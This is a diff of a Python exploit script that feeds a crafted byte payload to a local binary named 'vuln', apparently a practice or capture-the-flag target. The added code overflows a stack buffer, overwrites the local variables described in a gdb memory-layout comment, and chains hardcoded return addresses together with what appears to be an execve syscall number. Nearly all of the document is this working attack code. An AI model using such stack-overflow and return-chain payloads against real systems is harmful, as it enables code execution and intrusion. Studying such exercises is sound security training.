@@ -1,6 +1,7 @@
 import subprocess
+import binascii
 
-p = subprocess.Popen("/root/vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+p = subprocess.Popen("./vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 # Run `gdb vuln $(pgrep vuln)` on remote machine to attach!
 input("Press Enter to continue...")
@@ -18,26 +19,61 @@ p.stdin.flush()
 
 read_line()
 
-input = 20*"A" +\
-        "\xFF" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        "\x76\x11\x40\x00" + 4*"\x00" +\
-        "\x0b" + 7*"\x00" +\
-        "\x78\x11\x40\x00" + 4*"\x00" +\
-        8*"\x00" +\
-        "\x0a\x14\x40\x00" + 4*"\x00" +\
-        "\x08\x20\x40\x00" + 4*"\x00" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        8*"\x00" +\
-        "\x7a\x11\x40\x00" + 4*"\x00"
+# The memory layout looks propably like this for our local variables
+# 0x7ffdb0df7090:	0x00000000	0x00000000	0x00000000	0x00000000
+#                   ^-----------------input_buf-------------------
+# 0x7ffdb0df70a0:	0x004012b0	0x00000000	0x00000078	0x00000000
+#                   ---------^              ^---------n----------^
+# 0x7ffdb0df70b0:	0x022cf2a0	0x00000000	0x00000000	0xff000000
+#                   ^-------line---------^  ^--ret---^    ^^-len
+#
+#
+#
+# We want to set input_buf to "ABCAAAAAAAAAAAAAAAAA". because why not?
+# Then we need 4 layout bytes 0x00
+# Then set n to 8 zero bytes
+# Then set line to 8 zero bytes
+# Then set n to 8 zero bytes
+# Then set ret to 4 zero bytes
+# Then set len to 0xff
 
-print(input.encode())  # debug print to verify for ourselves
-p.stdin.write(input.encode("utf-8"))
+input_buf_ABCAAA = bytes([0x41, 0x42, 0x43, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41])
+
+address_maybe_useful = bytes([0x76, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
+address_maybe_also_useful = bytes([0x78, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
+address_maybe_extremely_useful = bytes([0x7a, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
+
+input = input_buf_ABCAAA +\
+        bytes([0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0xff]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        address_maybe_useful +\
+        bytes([0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        address_maybe_also_useful +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x0a, 0x14, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
+        address_maybe_extremely_useful
+
+#        "\x0a\x14\x40\x00" + 4*"\x00" +\
+#        "\x08\x20\x40\x00" + 4*"\x00" +\
+#        8*"\x00" +\
+#        8*"\x00" +\
+#        8*"\x00" +\
+#        8*"\x00" +\
+#        8*"\x00" +\
+#        "\x7a\x11\x40\x00" + 4*"\x00"
+
+print(binascii.hexlify(input, "-", -4))  # debug print to verify for ourselves
+p.stdin.write(input)
 p.stdin.flush()
 
 read_line()
